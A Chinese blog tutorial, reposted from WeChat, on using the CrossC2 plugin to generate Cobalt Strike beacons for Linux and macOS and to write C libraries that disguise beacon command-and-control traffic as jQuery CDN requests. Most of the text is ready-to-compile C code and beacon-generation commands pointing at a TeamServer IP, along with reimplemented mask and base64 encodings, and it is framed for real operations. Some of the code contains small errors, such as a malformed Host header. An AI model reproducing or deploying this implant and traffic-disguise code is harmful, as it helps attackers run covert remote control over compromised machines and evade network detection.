> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6G8ZCe5ow_nrvcF4wdWLnQ)

> _**本文来源：台下言书**_

之前在内部分享会上看到，感觉讲的很详细了，力荐一下。

本文取得 RichardTang 师傅授权转载，首发于先知社区。

前言
==

在讲解 CrossC2 的通信 API 之前感觉有必要先说一下基础的用法，另外有错误欢迎指正（毕竟我是真的菜）。

CrossC2
=======

介绍
--

简单说 CrossC2 能让你的 CobaltStrike 支持 Linux/MacOS/Android/IOS 平台的 Beacon 上线。

CrossC2-GitHub 地址

实验环境
----

*   CobaltStrike4.1
    
*   CentOS7 与 MacOS
    
*   CrossC2 - 2.2.2 版 (https://github.com/gloxec/CrossC2)
    
*   C2-Profile(https://github.com/threatexpress/malleable-c2)
    

基本使用
----

先将 CrossC2 主分支克隆到自己电脑上

```
git clone https://github.com/gloxec/CrossC2.git


```

找到 CrossC2.cna 文件，在`src/`目录下，修改该文件中的两项值。

```
$CC2_PATH = "/Users/xxx/Desktop/Tools/cs_plugin/CrossC2/2.2.2/src"; # 这里填src目录的绝对路径
$CC2_BIN = "genCrossC2.MacOS"; # 根据系统类型进行配置,对应src目录下的genCrossC2.XXX那三个文件的名字

```

将 TeamServer 上的`.cobaltstrike.beacon_keys`文件下回到本地，之后会用上 (我这里将文件名前边的点去掉了)。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUG6DJRmJ1p6jrAvWqR9X4ld6PJNLxQGib2Kzmm8sRL7240zCxVGVLQPA/640?wx_fmt=png)

启动你的 TeamServer，**这里先不要带上 C2-Profile 去启动。  
**

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUqR9A4G5T5dy0LebNamc2thT3zyIMjDeu9b5VpoazUqPqMmS4bwiahxQ/640?wx_fmt=png)

将`CrossC2.cna`文件加载到 CobaltStrike 中，之后创建`Https`监听器。  

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUBP71VyZdEmOEfZ9DhYAYpL1ibmPcv9RP7kiblsnBJGiclFBMn6qM74Jzg/640?wx_fmt=png)

生成 Beacon，命令如下 (如果你是 Windows 那就是 genCrossC2.Win.exe)。

`./genCrossC2.MacOS [TeamServer的IP] [HTTPS监听器端口] [.cobaltstrike.beacon_keys文件路径] [自定义的动态链接库文件] [运行Beacon的平台] [运行Beacon的平台位数] [输出的结果文件]`

```
./genCrossC2.MacOS 192.168.225.24 1443 cobaltstrike.beacon_keys null Linux x64 ./test


```

将生成的 Beacon 放到目标机器上去执行即可

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUBWF4071CaI7jwibZEs6pX7ZvuOcIh9cTOngia3icESkOyQdek5TKjQaWg/640?wx_fmt=png)

此时你的 TeamServer 即可支持 Windows、Linux...

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUAaz2kzO7D4MBRib3SnCpYe5pCCXwHicicIR1MWm9mxwHlXVfmAzSjlMyg/640?wx_fmt=png)

存在的问题
=====

上述操作是未带 C2-Profile，实战里相信没有师傅会不带 C2-Profile 就直接冲吧！

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUyTHcprf94qZB5wpkfmLb8M4VibgdrAA3jPZW54oWichiapIqxh1HAlDyQ/640?wx_fmt=png)

直接带上 C2-Profile，CrossC2 所生成的 Beacon 可能无法上线也可能是上线了执行不了命令（这里可以自己尝试一下）。因此 CrossC2 提供通信协议 API 的方式来解决该问题。

一些铺垫
====

在进入正题之前感觉有必要铺垫以下知识点

有 Profile 与无 Profile 对比
-----------------------

先对比一下带 Profile 和不带 Profile 时传递的数据包的差异，这里我以 jquery-c2.4.0.profile 默认配置为例进行解释。

下图是 Beacon 向 TeamServer 发送请求，TeamServer 做回应。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUib3nzib30jbffurYhlhURia3K77ibK1v2b1gtScqXJFFODCuGwGyqKs7dA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUaXRN191OdwlJTZh23m1CNyYXUsU7N7d5lZltnRPQSwW4ykB8oR3Hqw/640?wx_fmt=png)

C2-Profile

C2-Profile 文件决定了你对元数据使用哪些编码、哪种顺序、拼接哪些字符……，所以这里需要你对它的配置有一些了解。

以`jquery-c2.4.0.profile`默认配置为例，当 Beacon 要发送一个 POST 请求给 TeamServer 时会以`http-post {...}`的配置为准，Beacon 发送 GET 请求给 TeamServer 时以`http-get {...}`的配置为准。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUO2juHibqHaufh6ZXSa3xuOkn45pA7APmwsbwSNMzXFoRSEd1Unneb7Q/640?wx_fmt=png)

下图为对配置的含义粗略的解释

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUqx2JLg66OxIq6gGummGmDTJkVvhgyiczNxS7gSslbnvWcR13GeoZQibA/640?wx_fmt=png)

其中`output {...}`，表示元数据的处理流程。  

```
output {
            mask;
            base64url;
            # 2nd Line
            prepend "!function(e,t){\"use strict\"; ...... },P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement,Math.max(t.body[ ...... (e.jQuery=e.$=w),w});";
            print;
}


```

过程是从上往下，对应的伪代码为: `prepend + prepend + baseurl(mask(metadata)) + append` 处理完后进行响应 (`print`)。对应的`http-get {...}`也是一样的逻辑。所以上述处理完后就对应下图中的数据包

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUVn8m5EoTc4CUUa63dDA7TCNJgcibGWAz5RyltvOClOtw3EaXp7KibsFQ/640?wx_fmt=png)

元数据  

------

**此处元数据的概念为个人理解**

这里的元数据指的是还未进行处理的数据 (明文)，就是 CobaltStrike 的官方文档中所描述的 metadata，但是 metadata 实际应该是经过`AES`处理后的一个值，本质上和下图的是同一个，当然 metadata 中可能还封装了一些其他数据。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUZOgLLN8K76QdaO3wRLdicb7CPNHbcoC26oOCJsBJQFMa2Z3cDyyxJibA/640?wx_fmt=png)

元数据处理流程  

----------

那么元数据在发送出去前是经过了哪些处理呢？

下边为我画的一张流程图，即发送和接收的处理过程。(图中不包含秘钥交换的过程，更为详细可以参考 CobaltStrike 协议全析)

数据的流向可以是 TeamServer 流向 Beacon，也可以是 Beacon 流向 TeamServer，不同方向传输使用协议不一样，但是处理元数据的流程是一致的。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUeEuV6dW0EEavnYyB6C0kV39doQHriaQgECOKibthvK6gQnctfLexFUQw/640?wx_fmt=png)

CrossC2 通信协议 API  

===================

CrossC2 提供了一个 c2profile.c 文件，在该文件内编写相应的 c 代码，然后打包成. so 文件，在使用`./genCrossC2.MacOS`时指定编译好的. so 文件。这样生成的 Beacon 就可以按照 c 编写的逻辑构造数据包和解码数据包。

其中还提供了一个 https.profile，和默认的 c2profile.c 文件是配对的，可以直接使用。只需要按照下边的命令执操作即可

```
./teamserver 192.168.225.24 123456 https.profile


```

```
gcc c2profile.c -fPIC -shared -o lib_rebind_test.so
./genCrossC2.MacOS 192.168.225.24 1443 cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 ./test


```

通信函数介绍
------

*   Beacon 向 TeamServer 发送数据时触发
    

*   cc2_rebind_http_get_send
    
*   cc2_rebind_http_post_send
    

*   Beacon 接收 TeamServer 响应的数据时触发
    

*   cc2_rebind_http_get_recv
    
*   cc2_rebind_http_post_recv
    

*   查找有用的数据部分
    

*   find_payload
    

find_payload
------------

该函数用来取出有用的那部分数据，prepend 和 append 部分拼接的数据只是为了达到伪装的效果，实际上传输的真正数据部分也就`baseurl(mask(metadata))`部分。

prepend + prepend + `baseurl(mask(metadata))` + append 对应下图红框部分

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUX9LficxdxQlsoYOz150GBt3bibW9umbL5akJ4QTLHVBKZIlonVOUIIpA/640?wx_fmt=png)

它的使用很简单，只需要标记要切割部分数据的开始和结尾即可。  

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUcqVUEibk8OJj5dtdDycichFsvYx6wYB8Iue6ADpTPz1KiakuZj2c3VCUA/640?wx_fmt=png)

编码解码梳理
------

C2-Profile 的`server { ... output { ... } }`中描述了 TeamServer 响应的数据是如何编码的

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUtxBlqTKa3zUZVGklViaC36krfHJA6lCV0BNzxA2Q16QDbXocTtiaicYsA/640?wx_fmt=png)

那么这里就需要在 c2profile.c 文件的`cc2_rebind_http_post_recv`函数中实现`base64_encode(decode_mask(base64_decode(find_payload(data))))`(这里是伪代码)，这样即可拿到被 AES 加密的元数据，随后将元数据再进行 base64 编码后向下传递。  

同样的`client {...}`中描述了 Beacon 发送给 TeamServer 的数据是如何编码的，那么在发送给 TeamServer 之前就需要按 Profile 中的配置进行编码，那么意味着我们需要在`cc2_rebind_http_post_send`中实现`base64_encode(mask_encode(base64_decode(x)))`的操作。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUXwibZkjk4lqw23BbxZDTugtwwvLTLicZxjkAAbYIicmLEsfKF57DV22tw/640?wx_fmt=png)

同样的`http-get { ... }`配置处的实现思路也是一样的  

TeamServer 会根据 Profile 中配置的这个顺序从下往上进行解密拿到 AES 加密的元数据, 这个过程 TeamServer 在内部已经实现了。而 CrossC2 生成的 Beacon 是不会根据 Profile 中的配置进行生成的，所以需要手动编写编码和解码的部分。

带上 C2-Profile 重启 TeamServer
---------------------------

```
./teamserver 192.168.225.24 123456 jquery-c2.4.0.profile


```

实现方式 1
------

将 C2-Profile 中的 mask 编码去掉，下图只截了`http-post`，还需要去掉`http-get`部分的 mask。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUkoEX3jQMXXic9xicpbNQuic5RlrZfNqyf3tAeZzL8P1h7IyDQ263mfYHg/640?wx_fmt=png)

之后来编写 c2profile.c 文件  

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    char *requestBody = "GET /%s HTTP/1.1\r\n"
                        "Host: code.jquery.comr\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Cookie: __cfduid=%s\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n\r\n";
    char postPayload[20000];
    sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);

}

void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"
                        "Host: code.jquery.com\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n"
                        "Content-Length: %d\r\n\r\n%s";
    char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);
    sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);
    free(postPayload);
}

char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {

    rawData = strstr(rawData, start) + strlen(start);

    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));

    char *payload = (char *)calloc(*payload_len ,sizeof(char));
    memcpy(payload, rawData, *payload_len);
    return payload;
}

void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;
}

void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;
}


```

将`c2profile.c`文件编译成`.so`文件

```
gcc c2profile.c -fPIC -shared -o lib_rebind_test.so


```

指定. so 文件生成 Beacon 文件

```
./genCrossC2.MacOS 192.168.225.24 1443 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 ./test


```

运行上线，此时在带 C2-Profile 的情况下能正常上线 CrossC2 的 Beacon。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUMYmKSoickwZyfeTZQSBcJHXyKFfJn3cfVibKdyfJpFHy6zjB4OagKe9A/640?wx_fmt=png)

实现方式 2  

---------

在不去掉 C2-Profile 中的 Mask 编码，需要自己实现 Mask 的编码和解码逻辑方式如下。

非专业写 c 全靠临时百度硬编出来的，轻点喷。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

static const char *BASE64_STR_CODE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const short BASE64_INT_CODE[] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
                                        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
                                        -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1,
                                        -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
                                        17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30,
                                        31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
                                        51};
static const short BASE64_INT_LENGTH = sizeof(BASE64_INT_CODE) / sizeof(BASE64_INT_CODE[0]);

void base64_decode_to_ascii(char *base64Str, long res[]) {
    int i = 0;
    int j = 0;
    int v1 = 0;
    int v2 = 0;
    int v3 = 0;
    int base64StrLength = strlen(base64Str);

    for (i = 0; i < base64StrLength; ++i) {
        char ascii = base64Str[i];
        if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {
            break;
        } else {
            if (ascii == '=') {
                ++v3;
                v1 <<= 6;
                ++v2;
                switch (v2) {
                    case 1:
                    case 2:
                        return;
                    case 3:
                        break;
                    case 4:
                        res[j++] = (char) (v1 >> 16);
                        if (v3 == 1) {
                            res[j++] = (char) (v1 >> 8);
                        }
                        break;
                    case 5:
                        return;
                    default:
                        return;
                }
            } else {
                if (v3 > 0) {
                    return;
                }

                if (ascii >= 0 && ascii < BASE64_INT_LENGTH) {
                    short v4 = BASE64_INT_CODE[ascii];
                    if (v4 >= 0) {
                        v1 = (v1 << 6) + v4;
                        ++v2;
                        if (v2 == 4) {
                            res[j++] = (char) (v1 >> 16);
                            res[j++] = (char) (v1 >> 8 & 255);
                            res[j++] = (char) (v1 & 255);
                            v1 = 0;
                            v2 = 0;
                        }
                        continue;
                    }
                }

                if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {
                    return;
                }
            }
        }
    }
}

void ascii_to_base64_encode(long ascii[], unsigned long asciiLength, char res[]) {
    long i = 0;
    long j = 0;
    long v1 = 0;
    long v2 = 0;
    long v3 = 0;
    long v6 = 0;

    for (i = 0; i < asciiLength; ++i) {
        v6 = ascii[v1++];
        if (v6 < 0) {
            v6 += 256;
        }

        v2 = (v2 << 8) + v6;
        ++v3;
        if (v3 == 3) {
            res[j++] = BASE64_STR_CODE[v2 >> 18];
            res[j++] = BASE64_STR_CODE[v2 >> 12 & 63];
            res[j++] = BASE64_STR_CODE[v2 >> 6 & 63];
            res[j++] = BASE64_STR_CODE[v2 & 63];
            v2 = 0;
            v3 = 0;
        }
    }

    if (v3 > 0) {
        if (v3 == 1) {
            res[j++] = BASE64_STR_CODE[v2 >> 2];
            res[j++] = BASE64_STR_CODE[v2 << 4 & 63];
            res[j++] = (unsigned char) '=';
        } else {
            res[j++] = BASE64_STR_CODE[v2 >> 10];
            res[j++] = BASE64_STR_CODE[v2 >> 4 & 63];
            res[j++] = BASE64_STR_CODE[v2 << 2 & 63];
        }
        res[j] = (unsigned char) '=';
    }
}

unsigned long get_base64_decode_length(char *base64Str) {
    long num;
    long base64StrLength = strlen(base64Str);
    if (strstr(base64Str, "==")) {
        num = base64StrLength / 4 * 3 - 2;
    } else if (strstr(base64Str, "=")) {
        num = base64StrLength / 4 * 3 - 1;
    } else {
        num = base64StrLength / 4 * 3;
    }
    return sizeof(unsigned char) * num;
}

unsigned long get_base64_encode_length(long strLen) {
    long num;
    if (strLen % 3 == 0) {
        num = strLen / 3 * 4;
    } else {
        num = (strLen / 3 + 1) * 4;
    }
    return sizeof(unsigned char) * num;
}

void mask_decode(long ascii[], unsigned long asciiLength, long res[]) {
    long i = 0;
    long j = 0;
    short key[4] = {
            ascii[0],
            ascii[1],
            ascii[2],
            ascii[3]
    };
    for (i = 4; i < asciiLength; ++i) {
        res[j] = ascii[i] ^ key[j % 4];
        j++;
    }
}

void mask_encode(long ascii[], unsigned long asciiLength, long res[]) {
    long i = 0;
    srand(time(NULL));
    short key[4] = {
            (char) (rand() % 255),
            (char) (rand() % 255),
            (char) (rand() % 255),
            (char) (rand() % 255)
    };
    res[0] = key[0];
    res[1] = key[1];
    res[2] = key[2];
    res[3] = key[3];
    for (i = 4; i < asciiLength; i++) {
        res[i] = ascii[i - 4] ^ key[i % 4];
    }
}

char *fix_reverse(char *str) {
    int i = 0;
    unsigned long strLength = strlen(str);
    char *res = calloc(strLength + 4, strLength + 4);
    for (i = 0; i < strLength; ++i) {
        if (str[i] == '_') {
            res[i] = '/';
        } else if (str[i] == '-') {
            res[i] = '+';
        } else {
            res[i] = str[i];
        }
    }
    while (strlen(res) % 4 != 0) {
        res[strLength++] = '=';
    }
    res[strlen(res) + 1] = '\0';
    return res;
}

char *fix(char *str) {
    int i;
    unsigned long strLength = strlen(str);
    char *res = calloc(strLength, strLength);
    for (i = 0; i < strLength; i++) {
        if (str[i] == '/') {
            res[i] = '_';
        } else if (str[i] == '+') {
            res[i] = '-';
        } else if (str[i] == '=') {
            continue;
        } else {
            res[i] = str[i];
        }
    }
    return res;
}

char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
    rawData = strstr(rawData, start) + strlen(start);

    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));

    char *payload = (char *) calloc(*payload_len, sizeof(char));
    memcpy(payload, rawData, *payload_len);
    return payload;
}

char *cc2_rebind_http_post_send_param(char *data) {
    unsigned long base64DecodeLength = get_base64_decode_length(data);

    long base64DecodeRes[base64DecodeLength];
    memset(base64DecodeRes, 0, base64DecodeLength);
    base64_decode_to_ascii(data, base64DecodeRes);

    long maskEncodeRes[base64DecodeLength + 4];
    memset(maskEncodeRes, 0, base64DecodeLength + 4);
    mask_encode(base64DecodeRes, base64DecodeLength + 4, maskEncodeRes);

    unsigned long base64EncodeLength = get_base64_encode_length(sizeof(maskEncodeRes) / sizeof(maskEncodeRes[0]));
    char *result = calloc(base64EncodeLength, base64EncodeLength);
    ascii_to_base64_encode(maskEncodeRes, base64DecodeLength + 4, result);

    return result;
}

char *cc2_rebind_http_recv_param(char *payload) {
    char *data = fix_reverse(payload);

    unsigned long base64DecodeLength = get_base64_decode_length(data);
    long base64DecodeRes[base64DecodeLength];
    memset(base64DecodeRes, 0, base64DecodeLength);
    base64_decode_to_ascii(data, base64DecodeRes);

    long maskDecodeRes[base64DecodeLength - 4];
    memset(maskDecodeRes, 0, base64DecodeLength - 4);
    mask_decode(base64DecodeRes, base64DecodeLength, maskDecodeRes);

    unsigned long base64EncodeLength = get_base64_encode_length(base64DecodeLength - 4);
    char *result = calloc(base64EncodeLength, base64EncodeLength);
    ascii_to_base64_encode(maskDecodeRes, base64DecodeLength - 4, result);

    return result;
}

void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    char *requestBody = "GET /%s HTTP/1.1\r\n"
                        "Host: code.jquery.comr\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Cookie: __cfduid=%s\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n\r\n";

    char postPayload[20000];
    sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);

    *outputData_len = strlen(postPayload);
    *outputData = (char *) calloc(1, *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);
}

void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"
                        "Host: code.jquery.com\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n"
                        "Content-Length: %d\r\n\r\n%s";

    id = cc2_rebind_http_post_send_param(id);
    reqData = cc2_rebind_http_post_send_param(reqData);

    char *postPayload = (char *) calloc(1, strlen(requestBody) + strlen(reqData) + 200);

    sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);
    *outputData_len = strlen(postPayload);
    *outputData = (char *) calloc(1, *outputData_len);

    memcpy(*outputData, postPayload, *outputData_len);
    free(postPayload);
}

void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);

    *outputData = cc2_rebind_http_recv_param(payload);
    *outputData_len = strlen(*outputData);
}

void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);

    *outputData = cc2_rebind_http_recv_param(payload);
    *outputData_len = strlen(*outputData);
}


```

同样的编译成 so 文件，在生成 Beacon 时指定 so 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUg0yuI9LANz1MpK2zkv911QwCIITYFEu0RJs96ybQF8KG0mdFLFa1HA/640?wx_fmt=png)

难点和疑问  

========

编码解码函数的实现思路
-----------

在编写 c2profile.c 文件的过程中，用到 Base64、Mask 的相关编码和解码函数。

但是在实际实践过程中会发现，从网上找到的 c 版 Base64 编码解码函数是不能直接套用的，同时 Mask 编码解码为 CobaltStrike 中自实现的相关函数。

查阅 CobaltStrike 文档会发现，对这些编码有进行相关描述，当时文档中是没有给出具体细节的。所以这里需要借助 https://github.com/mai1zhi2/CobaltstrikeSource 来查看具体的函数实现。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUd3CSuqCMlBSMicic5ojuQD6NEGH94F0SsfdJZnCzYUWMXoNguibsHm6sg/640?wx_fmt=png)

只需要在 CobaltStrike 的源码中找到对应的函数实现，然后 C 代码照猫画虎的方式，最后再调试调试就可以实现了。  

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUnEcPIx1c3yrpIeMDc8icmLVRUGvAoXiaWDNRCgyBmzI8Ddoh8PThWQxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAU5lFibGYEd7IrUa9qDhF9wyL1c2M8OfG12XLEuqoWg8nWS2toWuLq0jA/640?wx_fmt=png)

同样可以参照该思路实现 netbios 的编码解码，嫌麻烦不想折腾可以只使用实现方式 1。

处理后的元数据为什么还需要进行一次 Base64
------------------------

https://github.com/gloxec/CrossC2/issues/89，作者也提供了回答。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ecyyPNE0XGg8iaOA6gWRAUHrvEibXSVHNwqgSwb8v3icyPr7BXHR5SxV3dD275pDfkwiaWQiaDGKqzAg/640?wx_fmt=png)

其实也可以在 c2profile.c 中通过 printf 函数打印参数值，就会发现传递进来的函数值是 base64 编码，那么正常你在使用 CrossC2 提供的 demo 文件时会发现，他在 c2profile.c 中没有对参数进行编码解码操作，意味着往下传递的参数就是 base64 形式的参数值。所以我们在处理完结果后应该已 base64 方式进行向下传递  

http-post 中的 server output
--------------------------

实际上会发现 CrossC2 提供的 https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile 文件中有看到使用 Mask 编码，但是提供的 https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c 文件中没有关于 Mask 的操作，关于这个问题可以参考 issue。作者给的答复: `实际目前server响应的post包并不带任何有效数据`，你品你细品。

c2profile.c 的代码放到 https://github.com/Richard-Tang/CrossC2-C2Profile，其实就是实现方式 2 里的那段代码。

****【往期推荐】****  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-python 命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附 EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

